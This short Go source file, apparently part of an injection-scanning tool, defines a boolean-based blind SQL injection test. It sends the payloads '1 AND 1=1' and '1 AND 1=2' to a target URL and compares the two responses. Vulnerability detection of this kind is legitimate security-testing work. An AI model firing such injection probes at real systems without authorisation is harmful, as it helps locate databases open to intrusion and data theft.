package inject

import "fmt"

func runBooleanTest(baseURL string) {
	fmt.Println("\n=== BOOLEAN-BASED TEST ===")

	trueResp := send(baseURL, "1 AND 1=1")
	falseResp := send(baseURL, "1 AND 1=2")

	fmt.Println("TRUE:\n", trueResp)
	fmt.Println("FALSE:\n", falseResp)

	if trueResp != falseResp {
		fmt.Println("⚠️ Blind SQL Injection possible")
	}
}
